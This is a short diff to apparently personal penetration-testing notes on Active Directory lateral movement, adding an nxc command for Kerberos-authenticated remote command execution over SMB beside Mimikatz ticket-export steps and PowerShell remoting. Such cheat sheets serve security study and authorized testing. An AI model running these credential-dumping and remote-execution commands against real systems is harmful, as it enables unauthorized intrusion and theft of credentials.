@@ -92,6 +92,8 @@ Enter-PSSession {PSSession_ID_returned}
 		- We can just change the local Administrator user if we have an administrative user
 
 **Pass the Ticket**
+- We can use `nxc` to do it automatically for us
+  - `nxc smb {machine_FQDN} -u {username} -p {password} -k -x {command_to_execute}`
 - TGTs only work on the machine they're created for, whereas TGSs offer flexibility
 - Export current in-memory tickets with `sekurlsa::tickets /export`
 	- This exports all tickets in `.kirbi` format in the same file directory, ls to find the ticket names (among other info)
